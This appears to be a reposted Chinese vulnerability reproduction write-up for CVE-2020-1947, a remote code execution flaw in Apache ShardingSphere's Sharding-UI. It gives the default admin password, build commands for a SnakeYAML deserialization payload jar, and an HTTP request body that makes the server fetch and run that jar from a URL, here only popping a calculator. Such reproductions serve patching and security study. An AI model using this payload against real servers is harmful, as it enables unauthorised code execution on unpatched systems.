# （CVE-2020-1947）Apache ShardingSphere远程代码执行漏洞

> 原文：[https://www.zhihuifly.com/t/topic/2820](https://www.zhihuifly.com/t/topic/2820)

# （CVE-2020-1947）Apache ShardingSphere远程代码执行漏洞

## 一、漏洞简介

## 二、漏洞影响

Apache ShardingSphere < 4.0.1

## 三、复现过程

Sharding-UI的默认密码为admin/admin

![image](img/147e7311c28fb049fe2cf3e71bb77142.png)

顺带一提，在`conf/application.properties`中存储了WEB端的端口和账号密码。

![image](img/bf565702c7f822801b9a05a45927c1d4.png)

### 安装Zookeeper

要想成功利用，需要先在Sharding-UI中添加一个注册中心，否则在后续利用中会提示`No activated registry center!`，所以需要搭建一个Zookeeper。 这里直接使用docker搭建Zookeeper，并且将2181端口映射出来到本地的2181端口。

```
docker pull zookeeper
docker run --privileged=true -d --name zookeeper --publish 2181:2181  -d zookeeper:latest 
```

### 配置registry-center

在Sharding-UI的registry-center模块配置Zookeeper的地址。

![image](img/30653ea188b55d648b7f60ee44a2c0b4.png)

成功连接即可。

![image](img/bcdbc80e07d3553feaa9e622d4aaa3ba.png)

### 生成payload

使用SnakeYAML反序列化小工具： https://github.com/ianxtianxt/yaml-payload 修改`src/artsploit/AwesomeScriptEngineFactory.java`文件，设置为弹出计算器。

![image](img/51bcc62473bcb95bd303645786163866.png)

编译生成jar包：

```
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ . 
```

然后使用python本地搭建HTTPServer，等待连接。

```
python -m SimpleHTTPServer 90 
```

### 代码执行

在web端的Rule Config——>Add Schema处加入YAML代码并提交。

![image](img/5ab144c9732d8a86f50d9a825045780d.png)

数据包正文：

```
{"name":"test","ruleConfiguration":"encryptors:\n    <encryptor-name>:\n      type: MD5\n      props:","dataSourceConfiguration":"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://localhost:90/yaml-payload.jar\"]]]]"} 
```

发送即可成功弹出计算器。

![image](img/7d6239e52c07a74da31df063de235006.png)